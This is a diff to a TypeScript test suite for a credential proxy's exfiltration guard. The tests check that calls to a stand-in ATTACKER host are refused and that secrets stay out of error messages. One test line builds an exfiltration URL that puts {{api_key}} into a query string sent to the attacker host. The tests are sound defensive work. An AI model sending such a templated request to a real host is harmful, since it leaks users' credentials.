@@ -11,7 +11,7 @@
 import { describe, it, expect, beforeEach } from "bun:test";
 import { truncateAll } from "../../helpers/db.ts";
 import { createTestContext, type TestContext } from "../../helpers/auth.ts";
-import { proxyCall, ProxyAuthorizationError } from "../../../src/services/credential-proxy/core.ts";
+import { proxyCall, ProxyCallError } from "../../../src/services/credential-proxy/core.ts";
 import {
   localIntegrationManifest,
   httpHeaderDelivery,
@@ -109,6 +109,7 @@ describe("proxyCall — credential-exfiltration guard", () => {
     extra: { headers?: Record<string, string>; body?: string; substituteBody?: boolean } = {},
   ) =>
     proxyCall({
+      orgId: ctx.orgId,
       spaceId: ctx.defaultSpaceId,
       actor: { type: "user", id: ctx.user.id },
       integrationId: PACKAGE_ID,
@@ -126,7 +127,10 @@ describe("proxyCall — credential-exfiltration guard", () => {
       () => null,
       (e: unknown) => e,
     );
-    expect(err).toBeInstanceOf(ProxyAuthorizationError);
+    expect(err).toBeInstanceOf(ProxyCallError);
+    expect(["unauthorized_target", "blocked_target", "credential_exfiltration_refused"]).toContain(
+      (err as ProxyCallError).code,
+    );
     const { message } = err as Error;
     expect(message).not.toContain(secret);
     return message;
@@ -180,11 +184,11 @@ describe("proxyCall — credential-exfiltration guard", () => {
       expect(up.hits.some((u) => u.startsWith(ATTACKER))).toBe(false);
     });
 
-    it("still reaches any public host without templating", async () => {
+    it("holds the injected credential to the allowlist without templating", async () => {
       const up = upstream();
-      const res = await call(up.fetchImpl, `${ATTACKER}/anything`);
-      expect(res.status).toBe(200);
-      expect(up.hits).toEqual([`${ATTACKER}/anything`]);
+      await expectRefused(call(up.fetchImpl, `${ATTACKER}/anything`));
+      expect(up.hits).toEqual([]);
+      expect((await call(up.fetchImpl, `${ALLOWED}/anything`)).status).toBe(200);
     });
   });
 
@@ -286,18 +290,25 @@ describe("proxyCall — credential-exfiltration guard", () => {
     it("refuses any templated call", async () => {
       const up = upstream();
       const err = await call(up.fetchImpl, `${ATTACKER}/?k={{api_key}}`).catch((e: unknown) => e);
-      expect(err).toBeInstanceOf(ProxyAuthorizationError);
+      expect(err).toMatchObject({ code: "credential_exfiltration_refused" });
       expect((err as Error).message).toContain("credential exfiltration");
       expect((err as Error).message).not.toContain(SECRET);
       expect(up.hits).toEqual([]);
     });
 
-    it("still reaches any public host without templating", async () => {
+    it("refuses the injected credential without templating", async () => {
       const up = upstream();
-      const res = await call(up.fetchImpl, `${ATTACKER}/anything`);
-      expect(res.status).toBe(200);
-      expect(up.hits).toEqual([`${ATTACKER}/anything`]);
+      const message = await expectRefused(call(up.fetchImpl, `${ATTACKER}/anything`));
+      expect(message).toContain("credential exfiltration");
+      expect(up.hits).toEqual([]);
     });
+  });
+
+  it("refuses an injected credential whose allowlist leaves the host to the caller", async () => {
+    await seedIntegration(ctx, [`${ALLOWED}/**`, "https://**"]);
+    const up = upstream();
+    await expectRefused(call(up.fetchImpl, `${ALLOWED}/anything`));
+    expect(up.hits).toEqual([]);
   });
 
   it("scrubs the substituted secret from a transport error", async () => {
@@ -328,7 +339,7 @@ describe("proxyCall — credential-exfiltration guard", () => {
     // A matching guess reads exactly like a non-matching one.
     for (const guess of ["alice", "jdoe"]) {
       const message = await expectRefused(call(up.fetchImpl, `https://${guess}.example.invalid/`));
-      expect(message).toContain(`host ${guess}.example.invalid `);
+      expect(message).toContain(`(host ${guess}.example.invalid)`);
     }
     expect(up.hits).toEqual([]);
   });
